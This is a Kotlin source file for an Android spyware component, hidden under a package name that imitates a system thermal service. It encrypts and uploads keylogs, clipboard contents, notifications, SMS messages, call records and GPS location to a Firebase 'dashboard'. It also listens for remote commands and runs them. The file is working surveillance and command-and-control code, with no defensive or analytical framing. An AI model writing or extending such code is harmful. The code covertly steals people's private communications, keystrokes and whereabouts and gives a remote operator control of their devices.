package com.android.system.service.thermal

import com.google.firebase.firestore.FirebaseFirestore
import com.google.firebase.storage.FirebaseStorage
import com.google.firebase.firestore.FieldValue

object FirestoreSync {
    private val db = FirebaseFirestore.getInstance()
    private val storage = FirebaseStorage.getInstance()
    
    // Device ID — should match the ID registered via the dashboard pairing modal
    private const val DEVICE_ID = "REPLACE_WITH_DEVICE_ID_FROM_DASHBOARD"

    // ── Telemetry log to Firestore (encrypted) ─────────────────────────────────
    fun syncLog(type: String, content: String, app: String? = null) {
        val encryptedContent = EncryptionEngine.encrypt(content)
        val log = hashMapOf<String, Any>(
            "type"      to type,
            "content"   to encryptedContent,
            "timestamp" to FieldValue.serverTimestamp()
        )
        app?.let { log["app"] = it }

        db.collection("devices").document(DEVICE_ID)
            .collection("telemetry").add(log)

        // Also update the device document so dashboard shows correct last-seen
        updateDeviceStatus()
    }

    private fun updateDeviceStatus() {
        db.collection("devices").document(DEVICE_ID).update(
            mapOf(
                "status"   to "online",
                "lastSeen" to FieldValue.serverTimestamp()
            )
        )
    }

    // ── Convenience helpers ────────────────────────────────────────────────────
    fun syncClipboard(content: String)  = syncLog("CLIPBOARD", content, "Clipboard")
    fun syncKeylog(content: String, app: String? = null) = syncLog("KEYLOG", content, app)
    fun syncNotification(packageName: String, title: String?, text: String?) {
        val raw = "[$packageName] $title: $text"
        syncLog("NOTIFICATION", raw, packageName)
    }
    fun syncSMS(sender: String, body: String) = syncLog("SMS", "[$sender] $body", "Messages")
    fun syncCall(number: String, duration: String) = syncLog("CALL", "Incoming from $number · $duration", "Phone")
    fun syncLocation(lat: Double, lon: Double, address: String?) {
        val content = "GPS Fix: ${lat}° N, ${lon}° E${address?.let { " ($it)" } ?: ""}"
        syncLog("LOCATION", content, "GPS")
    }

    // ── Commands polling ──────────────────────────────────────────────────────
    fun listenForCommands(onCommand: (String) -> Unit) {
        db.collection("devices").document(DEVICE_ID)
            .collection("commands")
            .whereEqualTo("status", "pending")
            .addSnapshotListener { snapshot, _ ->
                snapshot?.documents?.forEach { doc ->
                    val cmd = doc.getString("command") ?: return@forEach
                    onCommand(cmd)
                    doc.reference.update("status", "executed")
                }
            }
    }
}
